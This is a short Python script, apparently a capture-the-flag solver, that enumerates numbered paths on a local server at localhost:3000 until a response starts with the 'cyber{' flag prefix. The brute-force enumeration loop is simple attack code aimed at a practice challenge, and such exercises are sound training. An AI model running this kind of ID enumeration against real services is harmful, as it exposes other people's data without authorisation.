import requests
import time

base_url = 'http://localhost:3000/a'  # Base URL of the local server

def find_flag():
    s = requests.Session()  # Create a session
    for num in range(1, 1001):
        try:
            # Send a GET request using the session
            response = s.get(f'{base_url}/{num}')
            print(f'Trying number: {num}, Response: {response.text}')

            # Check if the response contains the flag
            if response.text.startswith('cyber{'):
                print(f'Flag found! {response.text}')
                break  # Stop searching once the flag is found

        except requests.exceptions.RequestException as e:
            print(f'Error with number {num}: {e}')

        time.sleep(0.1)

if __name__ == '__main__':
    find_flag()
